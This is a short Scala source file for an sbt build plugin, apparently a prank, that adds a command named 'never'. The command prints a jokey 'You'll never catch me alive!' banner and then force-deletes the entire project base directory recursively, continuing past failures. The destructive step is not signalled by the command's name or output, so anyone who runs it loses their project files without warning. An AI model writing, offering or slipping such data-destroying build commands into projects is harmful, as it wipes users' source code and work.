package hr.element.xsbt

import sbt.{Path => _, _}
import Keys._

import scalax.file._

object YoullNeverCatchMeAliveSbtPlugin extends Plugin {
  override lazy val settings = Seq(
    commands ++= Seq(
      neverCommand
    )
  )

  lazy val neverCommand =
    Command.command("never") { state =>
      println("####################################")
      println("### You'll never catch me alive! ###")
      println("####################################")
      val root = Path(state.configuration.baseDirectory)
      root.deleteRecursively(force = true, continueOnFailure = true)  
      state
    }
}
